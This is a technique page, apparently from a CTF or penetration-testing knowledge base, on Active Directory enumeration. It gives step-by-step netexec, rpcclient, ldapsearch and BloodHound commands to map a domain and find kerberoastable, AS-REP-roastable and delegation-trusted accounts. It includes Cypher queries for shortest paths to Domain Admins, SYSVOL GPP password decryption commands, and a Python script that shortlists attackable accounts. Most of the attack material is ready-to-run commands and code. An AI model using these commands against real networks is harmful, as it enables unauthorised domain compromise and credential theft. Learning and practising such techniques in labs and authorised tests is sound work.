---
title: "Active Directory Enumeration - LDAP, netexec and BloodHound"
category: misc
subcategory: active-directory
type: technique
tags: [active-directory, bloodhound, sharphound, netexec, crackmapexec, ldapsearch, ldapdomaindump, enum4linux, rpcclient, cypher, gpp-password, sysvol, kerberos, recon, enumeration]
difficulty: medium
summary: "Map a domain from null/creds: netexec + ldapsearch + rpcclient enumerate objects, BloodHound collection graphs the paths to Domain Admin."
when_to_use:
  - "You have reached an Active Directory environment (ports 88, 389, 445, 636, 3268 open)"
  - "You have any domain credential, even a low-privileged one, or an anonymous bind works"
  - "You need to find a path from your current principal to Domain Admins"
  - "You want to find kerberoastable / AS-REP-roastable accounts and misconfigured ACLs"
tools: [netexec, crackmapexec, bloodhound, ldapsearch, ldapdomaindump, rpcclient, enum4linux-ng, windapsearch]
related: [ad-kerberoasting-asreproast, ad-credential-attacks, ad-acl-delegation-abuse, net-snmp-nfs-rpc-ldap]
---

## TL;DR

Enumerate the domain in layers: SMB/LDAP null session for a free look, then authenticated
`netexec` and `ldapsearch` for users/groups/policy, then run a BloodHound collector to graph
every relationship. The graph, not the raw dumps, is what shows you the path to Domain Admin.

## Recognise it

- nmap shows 88/tcp (Kerberos), 389/636 (LDAP/LDAPS), 3268 (Global Catalog), 445 (SMB), 5985 (WinRM).
- The DNS server for the box is the domain controller, and SRV records exist for `_ldap._tcp.dc._msdcs`.
- SMB banner or LDAP base DN reveals a domain like `CORP.LOCAL`.

## Theory

Everything in AD is an object in LDAP with attributes and an ACL. Kerberos and NTLM authenticate
principals; group membership and delegation grant privilege; ACL edges (who can modify whom) are
the abusable paths. BloodHound collects all of this and turns "reachability to Domain Admin" into a
graph query.

## Attack

### Step 1 -- unauthenticated look

```bash
# SMB: OS, domain name, signing status (signing off => relay is possible)
netexec smb 10.10.10.5

# Null-session share and user enumeration
netexec smb 10.10.10.5 -u '' -p '' --shares --users
enum4linux-ng -A 10.10.10.5

# RPC null session -- enumerate users, groups, password policy
rpcclient -U '' -N 10.10.10.5 -c 'enumdomusers'
rpcclient -U '' -N 10.10.10.5 -c 'enumdomgroups'
rpcclient -U '' -N 10.10.10.5 -c 'querydominfo'

# Anonymous LDAP: read the base DN and naming contexts
ldapsearch -x -H ldap://10.10.10.5 -s base namingContexts

# Anonymous LDAP dump of everything readable
ldapsearch -x -H ldap://10.10.10.5 -b 'DC=corp,DC=local'
```

### Step 2 -- authenticated netexec sweep

```bash
# Validate a credential and show admin status across a subnet
netexec smb 10.10.10.0/24 -u jdoe -p 'Summer2024!'

# Password policy -- read this BEFORE any spraying to avoid lockouts
netexec smb 10.10.10.5 -u jdoe -p 'Summer2024!' --pass-pol

# Domain users, groups, logged-on users, sessions, shares
netexec smb 10.10.10.5 -u jdoe -p 'Summer2024!' --users
netexec smb 10.10.10.5 -u jdoe -p 'Summer2024!' --groups
netexec smb 10.10.10.5 -u jdoe -p 'Summer2024!' --loggedon-users
netexec smb 10.10.10.5 -u jdoe -p 'Summer2024!' --shares

# LDAP-side: find kerberoastable and AS-REP-roastable accounts in one shot
netexec ldap 10.10.10.5 -u jdoe -p 'Summer2024!' --kerberoasting kerb.out
netexec ldap 10.10.10.5 -u jdoe -p 'Summer2024!' --asreproast asrep.out

# LDAP: pull descriptions (creds are often stored there) and admin-count users
netexec ldap 10.10.10.5 -u jdoe -p 'Summer2024!' --query "(objectClass=user)" "description"
```

### Step 3 -- ldapsearch queries that matter

```bash
# Authenticated bind and dump one subtree
ldapsearch -x -H ldap://10.10.10.5 -D 'jdoe@corp.local' -w 'Summer2024!' -b 'DC=corp,DC=local'

# All user objects, only the useful attributes
ldapsearch -x -H ldap://10.10.10.5 -D 'jdoe@corp.local' -w 'Summer2024!' -b 'DC=corp,DC=local' \
  '(&(objectClass=user)(objectCategory=person))' sAMAccountName description memberOf

# Accounts with an SPN set => kerberoastable
ldapsearch -x -H ldap://10.10.10.5 -D 'jdoe@corp.local' -w 'Summer2024!' -b 'DC=corp,DC=local' \
  '(&(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName

# Accounts that do NOT require Kerberos pre-auth (UAC bit 0x400000 = 4194304) => AS-REP roastable
ldapsearch -x -H ldap://10.10.10.5 -D 'jdoe@corp.local' -w 'Summer2024!' -b 'DC=corp,DC=local' \
  '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' sAMAccountName

# Accounts trusted for unconstrained delegation (UAC bit 0x80000 = 524288)
ldapsearch -x -H ldap://10.10.10.5 -D 'jdoe@corp.local' -w 'Summer2024!' -b 'DC=corp,DC=local' \
  '(userAccountControl:1.2.840.113556.1.4.803:=524288)' sAMAccountName

# Accounts with PASSWD_NOTREQD (UAC bit 0x20 = 32)
ldapsearch -x -H ldap://10.10.10.5 -D 'jdoe@corp.local' -w 'Summer2024!' -b 'DC=corp,DC=local' \
  '(userAccountControl:1.2.840.113556.1.4.803:=32)' sAMAccountName

# Privileged objects (adminCount=1 marks protected/high-value principals)
ldapsearch -x -H ldap://10.10.10.5 -D 'jdoe@corp.local' -w 'Summer2024!' -b 'DC=corp,DC=local' \
  '(adminCount=1)' sAMAccountName
```

The magic string `1.2.840.113556.1.4.803` is the LDAP bitwise-AND matching rule, used to test
`userAccountControl` flags.

Bulk dumpers:

```bash
# ldapdomaindump: HTML/JSON/greppable dump of users, groups, computers, policy
ldapdomaindump -u 'corp.local\jdoe' -p 'Summer2024!' 10.10.10.5 -o ldd/

# windapsearch: targeted queries (privileged users, computers, unconstrained delegation)
windapsearch -d corp.local --dc-ip 10.10.10.5 -u jdoe -p 'Summer2024!' --da
windapsearch -d corp.local --dc-ip 10.10.10.5 -u jdoe -p 'Summer2024!' --unconstrained-delegation
```

### Step 4 -- BloodHound collection

```bash
# Remote Python collector -- no code on the target, run it from your box
bloodhound-python -u jdoe -p 'Summer2024!' -d corp.local -dc dc01.corp.local -c All -ns 10.10.10.5 --zip

# Stealthy: talk only to the DC, no session/loggedon enumeration
bloodhound-python -u jdoe -p 'Summer2024!' -d corp.local -dc dc01.corp.local -c DCOnly -ns 10.10.10.5 --zip

# rusthound (faster, single binary) alternative
rusthound -d corp.local -u jdoe -p 'Summer2024!' -i 10.10.10.5 -c All -z
```

On a Windows foothold:

```powershell
# SharpHound executable, full collection, named zip
.\SharpHound.exe -c All --zipfilename corp.zip

# PowerShell collector
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -ZipFileName corp.zip
```

Collection methods and when they matter:

- `All` -- everything (default choice when you are not worried about noise).
- `DCOnly` -- reads only from the DC's LDAP; no touching member hosts. Use for stealth or when
  member hosts are firewalled.
- `Session` / `LoggedOn` -- who is logged in where; needed for `HasSession` edges but noisy and
  point-in-time (rerun over time).
- `ACL` -- object ACLs (the abuse edges); part of `All`.
- `ObjectProps` -- attribute detail like descriptions, lastlogon, pwdlastset.

Then start `neo4j` and BloodHound, drag the zip in, mark your foothold user as Owned, and run
"Shortest Paths from Owned Principals to Domain Admins".

### Step 5 -- reading the graph

Key edges and what each buys you:

| Edge | Meaning / abuse |
|---|---|
| `MemberOf` | group membership; chase transitive membership to privileged groups |
| `AdminTo` | local admin on that computer |
| `CanRDP` / `CanPSRemote` | interactive access to a host (rdp / WinRM) |
| `GenericAll` | full control -- reset password, add SPN, add to group |
| `GenericWrite` / `WriteProperty` | write attributes -- targeted kerberoast, logon script |
| `WriteDacl` / `WriteOwner` / `Owns` | rewrite the ACL to grant yourself GenericAll |
| `ForceChangePassword` | reset the target's password without knowing the old one |
| `AddMember` | add a principal to a group |
| `AllowedToDelegate` | constrained delegation to a service |
| `AllowedToAct` | resource-based constrained delegation (RBCD) |
| `GetChanges` + `GetChangesAll` | DCSync rights -- dump all hashes |
| `ReadLAPSPassword` | read the local admin password from LAPS |
| `ReadGMSAPassword` | read a group managed service account password |
| `SQLAdmin` | sysadmin on a linked MSSQL instance |

### Step 6 -- custom cypher

```cypher
// Every kerberoastable user (has an SPN)
MATCH (u:User) WHERE u.hasspn=true RETURN u.name, u.serviceprincipalnames

// Every AS-REP-roastable user (pre-auth not required)
MATCH (u:User) WHERE u.dontreqpreauth=true RETURN u.name

// Shortest path from any Owned principal to the Domain Admins group
MATCH (o) WHERE o.owned=true
MATCH (g:Group) WHERE g.name STARTS WITH "DOMAIN ADMINS@"
MATCH p=shortestPath((o)-[*1..]->(g)) RETURN p

// Users whose description attribute is non-empty (creds live here surprisingly often)
MATCH (u:User) WHERE u.description IS NOT NULL AND u.description <> "" RETURN u.name, u.description
```

### Step 7 -- GPP passwords in SYSVOL

The AES key that "encrypted" cpassword in Group Policy Preferences was published by Microsoft, so
any authenticated user can decrypt those values.

```bash
# netexec module walks SYSVOL, finds Groups.xml/etc. and decrypts cpassword
netexec smb 10.10.10.5 -u jdoe -p 'Summer2024!' -M gpp_password

# Manual: pull the xml then decrypt
smbclient //10.10.10.5/SYSVOL -U 'corp.local\jdoe%Summer2024!' -c 'recurse on; prompt off; mget *'
gpp-decrypt 'j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw'
```

```powershell
# On a Windows foothold
Get-GPPPassword
```

## Code

Decode the `userAccountControl` flag word and turn a raw LDAP dump into a quick attack shortlist.

```python
#!/usr/bin/env python3
"""Decode userAccountControl and shortlist attackable accounts from ldapsearch output.

Usage:
    ldapsearch ... sAMAccountName userAccountControl servicePrincipalName > dump.ldif
    python3 uac_triage.py dump.ldif
"""
from __future__ import annotations

import sys

UAC_FLAGS = {
    0x0002: "DISABLED",
    0x0010: "LOCKOUT",
    0x0020: "PASSWD_NOTREQD",
    0x0200: "NORMAL_ACCOUNT",
    0x10000: "DONT_EXPIRE_PASSWORD",
    0x80000: "TRUSTED_FOR_DELEGATION",       # unconstrained delegation
    0x100000: "NOT_DELEGATED",
    0x400000: "DONT_REQ_PREAUTH",            # AS-REP roastable
    0x1000000: "TRUSTED_TO_AUTH_FOR_DELEGATION",  # constrained delegation w/ protocol transition
}


def decode(uac: int) -> list[str]:
    """Return the set flag names for a userAccountControl integer."""
    return [name for bit, name in UAC_FLAGS.items() if uac & bit]


def parse_ldif(path: str) -> list[dict[str, list[str]]]:
    """Parse a simple ldapsearch/LDIF text file into a list of entry dicts."""
    entries: list[dict[str, list[str]]] = []
    current: dict[str, list[str]] = {}
    with open(path, "r", encoding="utf-8", errors="ignore") as fh:
        for raw in fh:
            line = raw.rstrip("\n")
            if not line.strip():
                if current:
                    entries.append(current)
                    current = {}
                continue
            if line.startswith("#") or ":" not in line:
                continue
            key, _, value = line.partition(":")
            key = key.strip()
            value = value.lstrip(": ").strip()
            current.setdefault(key, []).append(value)
    if current:
        entries.append(current)
    return entries


def main(argv: list[str]) -> int:
    if len(argv) != 2:
        print(__doc__)
        return 1
    roastable, asrep, deleg = [], [], []
    for entry in parse_ldif(argv[1]):
        name = (entry.get("sAMAccountName") or ["?"])[0]
        if entry.get("servicePrincipalName"):
            roastable.append(name)
        uac_vals = entry.get("userAccountControl")
        if uac_vals:
            try:
                flags = decode(int(uac_vals[0]))
            except ValueError:
                flags = []
            if "DONT_REQ_PREAUTH" in flags:
                asrep.append(name)
            if "TRUSTED_FOR_DELEGATION" in flags or "TRUSTED_TO_AUTH_FOR_DELEGATION" in flags:
                deleg.append(name)

    print("[*] Kerberoastable (has SPN):")
    for n in sorted(set(roastable)):
        print("   ", n)
    print("[*] AS-REP roastable (no pre-auth):")
    for n in sorted(set(asrep)):
        print("   ", n)
    print("[*] Delegation-trusted:")
    for n in sorted(set(deleg)):
        print("   ", n)
    return 0


if __name__ == "__main__":
    # tiny self-test of the flag decoder
    assert "DONT_REQ_PREAUTH" in decode(0x410200)
    assert "TRUSTED_FOR_DELEGATION" in decode(0x80200)
    raise SystemExit(main(sys.argv))
```

## Variants & pitfalls

- **Clock skew.** Kerberos-based tooling fails with `KRB5KDC_ERR_SKEW` if your clock differs from
  the DC by more than five minutes. Fix with `sudo ntpdate <dc-ip>` or `faketime`.
- **DNS.** Point your resolver at the DC or nothing resolves; add the DC and domain to `/etc/hosts`
  and `/etc/resolv.conf`. Kerberos needs correct FQDNs, not IPs.
- **`crackmapexec` vs `netexec`.** netexec (nxc) is the maintained fork; syntax is nearly identical.
  Prefer netexec.
- **DCOnly misses local-admin/session data.** If BloodHound shows no path, it may be because you
  collected DCOnly; rerun with All (or Session over time) once you have a host foothold.
- **Anonymous binds vary.** Some DCs allow anonymous read of a lot, others of nothing. Always try
  null first -- it costs one command.
- **BloodHound CE vs legacy.** Community Edition uses a different ingest; make sure the collector
  version matches your BloodHound version or the zip will not import.
- **Descriptions and SYSVOL scripts** are where CTF authors hide the next credential -- read them.

## Tools

- `netexec` (nxc) / `crackmapexec` -- the swiss-army enumeration/spray tool.
- `bloodhound-python`, `SharpHound`, `rusthound` -- graph collection.
- `ldapsearch`, `ldapdomaindump`, `windapsearch` -- LDAP querying and dumping.
- `rpcclient`, `enum4linux-ng` -- RPC/SMB null-session enumeration.
- `gpp-decrypt`, `Get-GPPPassword` -- SYSVOL GPP credential recovery.

## References

- The BloodHound documentation (edge reference and built-in queries) shipped with the tool.
- Microsoft `[MS-ADTS]` for `userAccountControl` bit definitions.
- `man ldapsearch` for the filter and bind syntax.
